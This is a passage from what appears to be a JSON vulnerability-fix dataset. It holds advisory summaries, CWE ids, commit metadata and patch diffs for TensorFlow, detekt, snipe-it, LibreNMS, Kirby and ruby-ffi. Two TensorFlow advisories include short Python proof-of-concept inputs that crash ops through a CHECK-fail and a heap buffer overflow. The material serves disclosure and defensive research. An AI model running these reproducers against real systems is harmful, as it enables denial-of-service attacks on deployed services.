commit](https:\/\/github.com\/getkirby-v2\/panel\/commit\/7f9ac1876bacb89fd8f142f5e561a02ebb725baa).","published_date":"2021-01-14","chain_len":1,"project":"https:\/\/github.com\/getkirby-v2\/panel","commit_href":"https:\/\/github.com\/getkirby-v2\/panel\/commit\/7f9ac1876bacb89fd8f142f5e561a02ebb725baa","commit_sha":"7f9ac1876bacb89fd8f142f5e561a02ebb725baa","patch":"SINGLE","chain_ord":"['7f9ac1876bacb89fd8f142f5e561a02ebb725baa']","before_first_fix_commit":"{'5a569d4e3ddaea2b6628d7ec1472a3e8bc410881'}","last_fix_commit":"7f9ac1876bacb89fd8f142f5e561a02ebb725baa","chain_ord_pos":1.0,"commit_datetime":"12\/01\/2020, 10:11:11","message":"Better check for local environments","author":"Bastian Allgeier","comments":null,"stats":"{'additions': 41, 'deletions': 7, 'total': 48}","files":"{'app\/src\/panel.php': {'additions': 41, 'deletions': 7, 'changes': 48, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/getkirby-v2\/panel\/raw\/7f9ac1876bacb89fd8f142f5e561a02ebb725baa\/app%2Fsrc%2Fpanel.php', 'patch': \"@@ -493,13 +493,47 @@ public function license() {\\n   }\\n \\n   public function isLocal() {\\n-    $localhosts = array('::1', '127.0.0.1', '0.0.0.0');\\n-    return (\\n-      in_array(server::get('SERVER_ADDR'), $localhosts) ||\\n-      server::get('SERVER_NAME') == 'localhost' ||\\n-      str::endsWith(server::get('SERVER_NAME'), '.localhost') ||\\n-      str::endsWith(server::get('SERVER_NAME'), '.test')\\n-    );\\n+\\n+    $host = server::get('SERVER_NAME');\\n+    $ip   = server::get('SERVER_ADDR');\\n+\\n+    if ($host === 'localhost') {\\n+      return true;\\n+    }\\n+\\n+    if (str::endsWith($host, '.localhost') === true) {\\n+      return true;\\n+    }\\n+\\n+    if (str::endsWith($host, '.local') === true) {\\n+      return true;\\n+    }\\n+\\n+    if (str::endsWith($host, '.test') === true) {\\n+      return true;\\n+    }\\n+\\n+    if (in_array($ip, ['::1', '127.0.0.1']) === true) {\\n+\\n+      if (\\n+        isset($_SERVER['HTTP_X_FORWARDED_FOR']) === true &&\\n+        in_array($_SERVER['HTTP_X_FORWARDED_FOR'], ['::1', '127.0.0.1']) === false\\n+      ) {\\n+        return false;\\n+      }\\n+\\n+      if (\\n+        isset($_SERVER['HTTP_CLIENT_IP']) === true &&\\n+        in_array($_SERVER['HTTP_CLIENT_IP'], ['::1', '127.0.0.1']) === false\\n+      ) {\\n+        return false;\\n+      }\\n+\\n+      \/\/ no reverse proxy or the real client also comes from localhost\\n+      return true;\\n+    }\\n+\\n+    return false;\\n   }\\n \\n   public function notify($text) {\"}}","message_norm":"better check for local environments","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/src\/panel.php'])","num_files":1.0},{"index":80,"vuln_id":"GHSA-2cfc-865j-gm4w","cwe_id":"{'CWE-611'}","score":7.3,"chain":"{'https:\/\/github.com\/detekt\/detekt\/commit\/c965a8d2a6bbdb9bcfc6acfa7bbffd3da81f5395'}","dataset":"osv","summary":"XML External Entity Reference in detekt Improper Restriction of XML External Entity Reference in GitHub repository detekt\/detekt prior to 1.20.0.","published_date":"2022-04-22","chain_len":1,"project":"https:\/\/github.com\/detekt\/detekt","commit_href":"https:\/\/github.com\/detekt\/detekt\/commit\/c965a8d2a6bbdb9bcfc6acfa7bbffd3da81f5395","commit_sha":"c965a8d2a6bbdb9bcfc6acfa7bbffd3da81f5395","patch":"SINGLE","chain_ord":"['c965a8d2a6bbdb9bcfc6acfa7bbffd3da81f5395']","before_first_fix_commit":"{'08eac68caa24ced140cc017d4de3b258a470232b'}","last_fix_commit":"c965a8d2a6bbdb9bcfc6acfa7bbffd3da81f5395","chain_ord_pos":1.0,"commit_datetime":"01\/18\/2022, 17:21:06","message":"Parse Baseline in a secure way (#4499)","author":"Brais Gab\u00edn","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'detekt-core\/src\/main\/kotlin\/io\/gitlab\/arturbosch\/detekt\/core\/baseline\/BaselineFormat.kt': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/detekt\/detekt\/raw\/c965a8d2a6bbdb9bcfc6acfa7bbffd3da81f5395\/detekt-core%2Fsrc%2Fmain%2Fkotlin%2Fio%2Fgitlab%2Farturbosch%2Fdetekt%2Fcore%2Fbaseline%2FBaselineFormat.kt', 'patch': '@@ -3,6 +3,7 @@ package io.gitlab.arturbosch.detekt.core.baseline\\n import org.xml.sax.SAXParseException\\n import java.nio.file.Files\\n import java.nio.file.Path\\n+import javax.xml.XMLConstants\\n import javax.xml.parsers.SAXParserFactory\\n import javax.xml.stream.XMLStreamException\\n import javax.xml.stream.XMLStreamWriter\\n@@ -17,7 +18,11 @@ internal class BaselineFormat {\\n     fun read(path: Path): Baseline {\\n         try {\\n             Files.newInputStream(path).use {\\n-                val reader = SAXParserFactory.newInstance().newSAXParser()\\n+                val reader = SAXParserFactory.newInstance()\\n+                    .apply {\\n+                        setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\\n+                    }\\n+                    .newSAXParser()\\n                 val handler = BaselineHandler()\\n                 reader.parse(it, handler)\\n                 return handler.createBaseline()'}}","message_norm":"parse baseline in a secure way (#4499)","language":"en","entities":"[('secure', 'SECWORD', ''), ('#4499', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['detekt-core\/src\/main\/kotlin\/io\/gitlab\/arturbosch\/detekt\/core\/baseline\/BaselineFormat.kt'])","num_files":1.0},{"index":82,"vuln_id":"GHSA-2cpx-427x-q2c6","cwe_id":"{'CWE-190'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c'}","dataset":"osv","summary":"CHECK-fail in AddManySparseToTensorsMap ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  `tf.raw_ops.AddManySparseToTensorsMap`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nsparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)\nsparse_values = tf.ones([1], dtype=tf.int64)\n\nshape = tf.Variable(tf.ones([55], dtype=tf.int64))\nshape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))\n\ntf.raw_ops.AddManySparseToTensorsMap(sparse_indices=sparse_indices,\n                    sparse_values=sparse_values,\n                    sparse_shape=shape)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f9896890c4c703ae0a0845394086e2e1e523299\/tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc#L257) takes the values specified in `sparse_shape` as dimensions for the output shape: \n\n```cc\n    TensorShape tensor_input_shape(input_shape->vec<int64>());\n```\n\nThe [`TensorShape` constructor](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f9896890c4c703ae0a0845394086e2e1e523299\/tensorflow\/core\/framework\/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f9896890c4c703ae0a0845394086e2e1e523299\/tensorflow\/core\/framework\/tensor_shape.cc#L212-L296) returns a non-OK status.\n  \n```cc\ntemplate <class Shape>\nTensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate <class Shape>\nStatus TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate <class Shape>\nStatus TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial && (num_elements() < 0 || size < 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements < 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c","commit_sha":"69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c","patch":"SINGLE","chain_ord":"['69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c']","before_first_fix_commit":"{'6f9896890c4c703ae0a0845394086e2e1e523299'}","last_fix_commit":"69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2021, 19:14:41","message":"Fix overflow CHECK issue with `tf.raw_ops.AddManySparseToTensorsMap`.\n\nPiperOrigin-RevId: 369492969\nChange-Id: I1d70d6c0c92e3d7a25bc3b3aa2a0c0ac9688bf81","author":"Amit Patankar","comments":null,"stats":"{'additions': 19, 'deletions': 7, 'total': 26}","files":"{'tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc': {'additions': 19, 'deletions': 7, 'changes': 26, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c\/tensorflow%2Fcore%2Fkernels%2Fsparse_tensors_map_ops.cc', 'patch': '@@ -21,16 +21,14 @@ limitations under the License.\\n #include <utility>\\n #include <vector>\\n \\n-#include \"tensorflow\/core\/framework\/op_kernel.h\"\\n-#include \"tensorflow\/core\/framework\/register_types.h\"\\n-\\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n #include \"tensorflow\/core\/framework\/resource_mgr.h\"\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_util.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\\n+#include \"tensorflow\/core\/util\/overflow.h\"\\n #include \"tensorflow\/core\/util\/sparse\/sparse_tensor.h\"\\n \\n namespace tensorflow {\\n@@ -254,16 +252,30 @@ class AddManySparseToTensorsMapOp : public SparseTensorAccessingOp {\\n         errors::InvalidArgument(\\n             \"Rank of input SparseTensor should be > 1, but saw rank: \", rank));\\n \\n-    TensorShape tensor_input_shape(input_shape->vec<int64>());\\n+    auto input_shape_vec = input_shape->vec<int64>();\\n+    int new_num_elements = 1;\\n+    bool overflow_ocurred = false;\\n+    for (int i = 0; i < input_shape_vec.size(); i++) {\\n+      new_num_elements =\\n+          MultiplyWithoutOverflow(new_num_elements, input_shape_vec(i));\\n+      if (new_num_elements < 0) {\\n+        overflow_ocurred = true;\\n+      }\\n+    }\\n+\\n+    OP_REQUIRES(\\n+        context, !overflow_ocurred,\\n+        errors::Internal(\"Encountered overflow from large input shape.\"));\\n+\\n+    TensorShape tensor_input_shape(input_shape_vec);\\n     gtl::InlinedVector<int64, 8> std_order(rank);\\n     std::iota(std_order.begin(), std_order.end(), 0);\\n     SparseTensor input_st;\\n     OP_REQUIRES_OK(context, SparseTensor::Create(*input_indices, *input_values,\\n                                                  tensor_input_shape, std_order,\\n                                                  &input_st));\\n \\n-    auto input_shape_t = input_shape->vec<int64>();\\n-    const int64 N = input_shape_t(0);\\n+    const int64 N = input_shape_vec(0);\\n \\n     Tensor sparse_handles(DT_INT64, TensorShape({N}));\\n     auto sparse_handles_t = sparse_handles.vec<int64>();\\n@@ -274,7 +286,7 @@ class AddManySparseToTensorsMapOp : public SparseTensorAccessingOp {\\n     \/\/ minibatch entries.\\n     TensorShape output_shape;\\n     OP_REQUIRES_OK(context, TensorShapeUtils::MakeShape(\\n-                                input_shape_t.data() + 1,\\n+                                input_shape_vec.data() + 1,\\n                                 input_shape->NumElements() - 1, &output_shape));\\n \\n     \/\/ Get groups by minibatch dimension'}}","message_norm":"fix overflow check issue with `tf.raw_ops.addmanysparsetotensorsmap`.\n\npiperorigin-revid: 369492969\nchange-id: i1d70d6c0c92e3d7a25bc3b3aa2a0c0ac9688bf81","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('369492969', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc'])","num_files":1.0},{"index":85,"vuln_id":"GHSA-2cqg-q7jm-j35c","cwe_id":"{'CWE-79'}","score":3.9,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/9ed1442bd124710f4178992cc4eca5236c7396b9'}","dataset":"osv","summary":"snipe-it is vulnerable to Cross-site Scripting snipe-it is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').","published_date":"2021-11-15","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/9ed1442bd124710f4178992cc4eca5236c7396b9","commit_sha":"9ed1442bd124710f4178992cc4eca5236c7396b9","patch":"SINGLE","chain_ord":"['9ed1442bd124710f4178992cc4eca5236c7396b9']","before_first_fix_commit":"{'edf98cb7951a922cdef7505e1efd115f92d1afd9', '3ea209a507fbcc992e0a9152e2074709e8459b47'}","last_fix_commit":"9ed1442bd124710f4178992cc4eca5236c7396b9","chain_ord_pos":1.0,"commit_datetime":"11\/09\/2021, 04:32:02","message":"Merge pull request #10286 from uberbrady\/fix_bulk_audit_xss\n\nEscape asset_tag attribute at controller level for bulk checkout","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/Http\/Controllers\/Api\/AssetsController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/9ed1442bd124710f4178992cc4eca5236c7396b9\/app%2FHttp%2FControllers%2FApi%2FAssetsController.php', 'patch': \"@@ -910,7 +910,7 @@ public function audit(Request $request) {\\n             }\\n         }\\n \\n-        return response()->json(Helper::formatStandardApiResponse('error', ['asset_tag'=> e($request->input('asset_tag'))], 'Asset with tag '.$request->input('asset_tag').' not found'));\\n+        return response()->json(Helper::formatStandardApiResponse('error', ['asset_tag'=> e($request->input('asset_tag'))], 'Asset with tag '.e($request->input('asset_tag')).' not found'));\"}}","message_norm":"merge pull request #10286 from uberbrady\/fix_bulk_audit_xss\n\nescape asset_tag attribute at controller level for bulk checkout","language":"en","entities":"[('#10286', 'ISSUE', ''), ('fix_bulk_audit_xss', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Api\/AssetsController.php'])","num_files":1.0},{"index":89,"vuln_id":"GHSA-2gfx-95x2-5v3x","cwe_id":"{'CWE-787'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a324ac84e573fba362a5e53d4e74d5de6729933e'}","dataset":"osv","summary":"Heap buffer overflow in `QuantizedReshape` ### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedReshape` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant([], dtype=tf.qint32)\nshape = tf.constant([], dtype=tf.int32)\ninput_min = tf.constant([], dtype=tf.float32)\ninput_max = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedReshape(tensor=tensor, shape=shape, input_min=input_min, input_max=input_max)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a324ac84e573fba362a5e53d4e74d5de6729933e\/tensorflow\/core\/kernels\/quantized_reshape_op.cc#L38-L55) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc\nconst auto& input_min_float_tensor = ctx->input(2);\n...\nconst float input_min_float = input_min_float_tensor.flat<float>()(0);\nconst auto& input_max_float_tensor = ctx->input(3);\n...\nconst float input_max_float = input_max_float_tensor.flat<float>()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat<T>()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [a324ac84e573fba362a5e53d4e74d5de6729933e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a324ac84e573fba362a5e53d4e74d5de6729933e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a324ac84e573fba362a5e53d4e74d5de6729933e","commit_sha":"a324ac84e573fba362a5e53d4e74d5de6729933e","patch":"SINGLE","chain_ord":"['a324ac84e573fba362a5e53d4e74d5de6729933e']","before_first_fix_commit":"{'2ec2ce48365486311e56b3503bb75ab9e72a813d'}","last_fix_commit":"a324ac84e573fba362a5e53d4e74d5de6729933e","chain_ord_pos":1.0,"commit_datetime":"04\/22\/2021, 01:11:15","message":"Validate arguments to `QuantizedReshape`.\n\nEnsure that validations from `Reshape` also terminate `QuantizedReshape` on failure.\n\nPiperOrigin-RevId: 369775421\nChange-Id: If8c5342267aceea65b7cb83a4b183304886f1ce8","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 23, 'deletions': 2, 'total': 25}","files":"{'tensorflow\/core\/kernels\/quantized_reshape_op.cc': {'additions': 23, 'deletions': 2, 'changes': 25, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a324ac84e573fba362a5e53d4e74d5de6729933e\/tensorflow%2Fcore%2Fkernels%2Fquantized_reshape_op.cc', 'patch': '@@ -17,6 +17,7 @@ limitations under the License.\\n \\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n+#include \"tensorflow\/core\/framework\/tensor_shape.h\"\\n #include \"tensorflow\/core\/framework\/tensor_types.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/kernels\/reshape_op.h\"\\n@@ -30,9 +31,29 @@ class QuantizedReshapeOp : public ReshapeOp {\\n   void Compute(OpKernelContext* ctx) override {\\n     \/\/ This call processes inputs 1 and 2 to write output 0.\\n     ReshapeOp::Compute(ctx);\\n+    if (!ctx->status().ok()) {\\n+      return;\\n+    }\\n+\\n+    const auto& input_min_float_tensor = ctx->input(2);\\n+    const auto& input_min_float_shape = input_min_float_tensor.shape();\\n+    OP_REQUIRES(ctx,\\n+                TensorShapeUtils::IsScalar(input_min_float_shape) ||\\n+                    (TensorShapeUtils::IsVector(input_min_float_shape) &&\\n+                     (input_min_float_shape.dim_size(0) == 1)),\\n+                errors::InvalidArgument(\\n+                    \"input_min must be a scalar or a vector of 1 element\"));\\n+    const float input_min_float = input_min_float_tensor.flat<float>()(0);\\n+    const auto& input_max_float_tensor = ctx->input(3);\\n+    const auto& input_max_float_shape = input_max_float_tensor.shape();\\n+    OP_REQUIRES(ctx,\\n+                TensorShapeUtils::IsScalar(input_max_float_shape) ||\\n+                    (TensorShapeUtils::IsVector(input_max_float_shape) &&\\n+                     (input_max_float_shape.dim_size(0) == 1)),\\n+                errors::InvalidArgument(\\n+                    \"input_max must be a scalar or a vector of 1 element\"));\\n+    const float input_max_float = input_max_float_tensor.flat<float>()(0);\\n \\n-    const float input_min_float = ctx->input(2).flat<float>()(0);\\n-    const float input_max_float = ctx->input(3).flat<float>()(0);\\n     Tensor* output_min = nullptr;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(1, TensorShape({}), &output_min));\\n     output_min->flat<float>()(0) = input_min_float;'}}","message_norm":"validate arguments to `quantizedreshape`.\n\nensure that validations from `reshape` also terminate `quantizedreshape` on failure.\n\npiperorigin-revid: 369775421\nchange-id: if8c5342267aceea65b7cb83a4b183304886f1ce8","language":"en","entities":"[('validate', 'ACTION', ''), ('ensure', 'ACTION', ''), ('369775421', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_reshape_op.cc'])","num_files":1.0},{"index":91,"vuln_id":"GHSA-2gqg-2rg7-gh33","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/librenms\/librenms\/commit\/cc6112b8fb36039b862b42d86eb79ef7ee89d31b'}","dataset":"osv","summary":"Cross site scripting in librenms LibreNMS v22.3.0 was discovered to contain a cross-site scripting (XSS) vulnerability via the component \/Table\/GraylogController.php.","published_date":"2022-06-03","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/commit\/cc6112b8fb36039b862b42d86eb79ef7ee89d31b","commit_sha":"cc6112b8fb36039b862b42d86eb79ef7ee89d31b","patch":"SINGLE","chain_ord":"['cc6112b8fb36039b862b42d86eb79ef7ee89d31b']","before_first_fix_commit":"{'9c126572a2aebd43838aab9bf6abc09719ce983e'}","last_fix_commit":"cc6112b8fb36039b862b42d86eb79ef7ee89d31b","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2022, 23:10:02","message":"fix graylog xss (#13931)","author":"Tony Murray","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'app\/Http\/Controllers\/Table\/GraylogController.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/cc6112b8fb36039b862b42d86eb79ef7ee89d31b\/app%2FHttp%2FControllers%2FTable%2FGraylogController.php', 'patch': '@@ -118,8 +118,8 @@ private function formatMessage($message)\\n         return [\\n             \\'severity\\'  => $this->severityLabel($level),\\n             \\'timestamp\\' => $displayTime,\\n-            \\'source\\'    => $device ? Url::deviceLink($device) : $message[\\'message\\'][\\'source\\'],\\n-            \\'message\\'   => $message[\\'message\\'][\\'message\\'] ?? \\'\\',\\n+            \\'source\\'    => $device ? Url::deviceLink($device) : htmlspecialchars($message[\\'message\\'][\\'source\\']),\\n+            \\'message\\'   => htmlspecialchars($message[\\'message\\'][\\'message\\'] ?? \\'\\'),\\n             \\'facility\\'  => is_numeric($facility) ? \"($facility) \" . __(\"syslog.facility.$facility\") : $facility,\\n             \\'level\\'     => (is_numeric($level) && $level >= 0) ? \"($level) \" . __(\"syslog.severity.$level\") : $level,\\n         ];'}}","message_norm":"fix graylog xss (#13931)","language":"no","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('#13931', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Table\/GraylogController.php'])","num_files":1.0},{"index":92,"vuln_id":"GHSA-2gw2-8q9w-cw8p","cwe_id":"{'CWE-426'}","score":7.8,"chain":"{'https:\/\/github.com\/ffi\/ffi\/commit\/e0fe486df0e117ed67b0282b6ada04b7214ca05c', 'https:\/\/github.com\/ffi\/ffi\/commit\/09e0c6076466b4383da7fa4e13f714311109945a'}","dataset":"osv","summary":"Ruby-ffi has a DLL loading issue  ruby-ffi version 1.9.23 and earlier has a DLL loading issue which can be hijacked on Windows OS, when a Symbol is used as DLL name instead of a String This vulnerability appears to have been fixed in v1.9.24 and later.","published_date":"2018-08-31","chain_len":2,"project":"https:\/\/github.com\/ffi\/ffi","commit_href":"https:\/\/github.com\/ffi\/ffi\/commit\/e0fe486df0e117ed67b0282b6ada04b7214ca05c","commit_sha":"e0fe486df0e117ed67b0282b6ada04b7214ca05c","patch":"MULTI","chain_ord":"['e0fe486df0e117ed67b0282b6ada04b7214ca05c', '09e0c6076466b4383da7fa4e13f714311109945a']","before_first_fix_commit":"{'e0fe486df0e117ed67b0282b6ada04b7214ca05c'}","last_fix_commit":"09e0c6076466b4383da7fa4e13f714311109945a","chain_ord_pos":1.0,"commit_datetime":"06\/01\/2018, 20:18:25","message":"Don't treat Symbol args different to Strings in ffi_lib\n\nSymbols were sent directly to FFI::DynamicLibrary.open in the first\nattempt, resulting in a TypeError, so that only the mangled library\nname was actually loaded.\n\nThis moves conversion to String to the front, so that subsequent\ncalls can assume Strings only.","author":"Lars Kanis","comments":"{'com_1': {'author': 'Cbeg-76', 'datetime': '08\/23\/2019, 15:31:30', 'body': 'gem install ffi'}}","stats":"{'additions': 1, 'deletions': 3, 'total': 4}","files":"{'lib\/ffi\/library.rb': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ffi\/ffi\/raw\/e0fe486df0e117ed67b0282b6ada04b7214ca05c\/lib%2Fffi%2Flibrary.rb', 'patch': '@@ -43,7 +43,6 @@ module FFI\\n   #  FFI.map_library_name \\'jpeg\\'  # -> \"jpeg.dll\"\\n   def self.map_library_name(lib)\\n     # Mangle the library name to reflect the native library naming conventions\\n-    lib = lib.to_s unless lib.kind_of?(String)\\n     lib = Library::LIBC if lib == \\'c\\'\\n \\n     if lib && File.basename(lib) == lib\\n@@ -103,7 +102,7 @@ def ffi_lib(*names)\\n           FFI::DynamicLibrary.open(nil, FFI::DynamicLibrary::RTLD_LAZY | FFI::DynamicLibrary::RTLD_LOCAL)\\n \\n         else\\n-          libnames = (name.is_a?(::Array) ? name : [ name ]).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\\n+          libnames = (name.is_a?(::Array) ? name : [ name ]).map(&:to_s).map { |n| [ n, FFI.map_library_name(n) ].uniq }.flatten.compact\\n           lib = nil\\n           errors = {}\\n \\n@@ -126,7 +125,6 @@ def ffi_lib(*names)\\n                 retry\\n               else\\n                 # TODO better library lookup logic\\n-                libname = libname.to_s\\n                 unless libname.start_with?(\"\/\")\\n                   path = [\\'\/usr\/lib\/\\',\\'\/usr\/local\/lib\/\\'].find do |pth|\\n                     File.exist?(pth + libname)'}}","message_norm":"don't treat symbol args different to strings in ffi_lib\n\nsymbols were sent directly to ffi::dynamiclibrary.open in the first\nattempt, resulting in a typeerror, so that only the mangled library\nname was actually loaded.\n\nthis moves conversion to string to the front, so that subsequent\ncalls can assume strings only.","language":"en","entities":"[('typeerror', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/ffi\/library.rb'])","num_files":1.0},{"index":93,"vuln_id":"GHSA-2gw2-8q9w-cw8p","cwe_id":"{'CWE-426'}","score":7.8,"chain":"{'https:\/\/github.com\/ffi\/ffi\/commit\/e0fe486df0e117ed67b0282b6ada04b7214ca05c', 'https:\/\/github.com\/ffi\/ffi\/commit\/09e0c6076466b4383da7fa4e13f714311109945a'}","dataset":"osv","summary":"Ruby-ffi has a DLL loading issue  ruby-ffi version 1.9.23 and earlier has a DLL loading issue which can be hijacked on Windows OS, when a Symbol is used as DLL name instead of a String This vulnerability appears to have been fixed in v1.9.24 and later.","published_date":"2018-08-31","chain_len":2,"project":"https:\/\/github.com\/ffi\/ffi","commit_href":"https:\/\/github.com\/ffi\/ffi\/commit\/09e0c6076466b4383da7fa4e13f714311109945a","commit_sha":"09e0c6076466b4383da7fa4e13f714311109945a","patch":"MULTI","chain_ord":"['e0fe486df0e117ed67b0282b6ada04b7214ca05c', '09e0c6076466b4383da7fa4e13f714311109945a']","before_first_fix_commit":"{'e0fe486df0e117ed67b0282b6ada04b7214ca05c'}","last_fix_commit":"09e0c6076466b4383da7fa4e13f714311109945a","chain_ord_pos":2.0,"commit_datetime":"06\/01\/2018, 20:31:40","message":"Don't search in hardcoded paths on Windows\n\nNative Windows apps don't use \"\/usr\" path to store system dlls.\nIt's even more harm than good to search through these directories,\nsince they are used in Cygwin and it can lead to accidentaly loading\nCygwin DLLs into native Windows apps.\n\nHardcoded paths are disabled for MINGW and MSWIN environments only.\nThey are still present on Cygwin and MSYS2, because these POSIX-API\nbased environments don't use LoadLibrary() but dl_open() to load DLLs.","author":"Lars Kanis","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/ffi\/library.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 